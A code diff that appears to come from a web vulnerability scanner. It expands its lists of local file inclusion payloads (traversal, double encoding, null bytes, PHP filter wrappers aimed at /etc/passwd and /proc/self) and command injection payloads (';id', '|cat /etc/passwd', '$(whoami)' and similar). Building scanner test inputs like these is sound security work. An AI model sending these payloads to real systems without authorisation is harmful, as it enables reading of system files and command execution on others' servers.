@@ -341,24 +341,40 @@ async def test_open_redirect(
 # ---------------------------------------------------------------------------
 
 _LFI_PAYLOADS_LINUX = [
+    # Direct path
     "/etc/passwd",
+    # Standard traversal (varying depth)
     "../../../../../../etc/passwd",
+    "../../../etc/passwd",
+    "../../../../etc/passwd",
+    # Dot-dot-slash bypass variants
     "....//....//....//etc/passwd",
+    "..../....//....//etc/passwd",
+    "..;/..;/..;/etc/passwd",
+    # URL encoding
     "..%2f..%2f..%2f..%2f..%2fetc/passwd",
     "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    # Double encoding
+    "..%252f..%252f..%252f..%252fetc/passwd",
+    "%252e%252e%252f%252e%252e%252fetc/passwd",
+    # Null byte bypass (PHP < 5.3.4)
     "/etc/passwd%00",
     "/etc/passwd%00.jpg",
-    # PHP wrapper payloads
+    "/etc/passwd%00.html",
+    "../../../../../../etc/passwd%00",
+    # UTF-8 overlong encoding
+    "..%c0%af..%c0%afetc/passwd",
+    # PHP wrappers
     "php://filter/convert.base64-encode/resource=/etc/passwd",
     "php://filter/convert.base64-encode/resource=index",
     "php://filter/read=string.rot13/resource=/etc/passwd",
-    # Null byte bypass
-    "....//....//....//etc/passwd%00",
-    # Double encoding
-    "..%252f..%252f..%252f..%252fetc/passwd",
-    # proc self for Python/Node apps
+    # proc filesystem (Python/Node/Java apps)
     "/proc/self/environ",
     "/proc/self/cmdline",
+    "/proc/self/fd/0",
+    # Absolute path with encoding
+    "%2fetc%2fpasswd",
 ]
 
 _LFI_PAYLOADS_WINDOWS = [
@@ -1169,13 +1185,38 @@ _RCE_TIME_PAYLOADS_WINDOWS = [
 ]
 
 _RCE_OUTPUT_PAYLOADS = [
+    # Semicolon separator
     ";id",
-    "|id",
-    "$(id)",
+    ";cat /etc/passwd",
     ";whoami",
+    # Pipe (most common for command chaining)
+    "|id",
     "|cat /etc/passwd",
+    "|whoami",
+    # Command substitution
+    "$(id)",
+    "$(cat /etc/passwd)",
+    "$(whoami)",
+    # Backtick substitution
+    "`id`",
+    "`cat /etc/passwd`",
+    # Newline injection
     "%0aid",
+    "%0acat /etc/passwd",
     "\nid",
+    "\ncat /etc/passwd",
+    # Ampersand (background)
+    "&id",
+    "&&id",
+    # Double pipe (OR)
+    "||id",
+    # URL-encoded separators
+    "%7Cid",           # |id
+    "%7Ccat+/etc/passwd",  # |cat /etc/passwd
+    "%3Bid",           # ;id
+    # Null byte + command
+    "%00|id",
+    "%00;id",
 ]
 
 _RCE_OUTPUT_PAYLOADS_WINDOWS = [
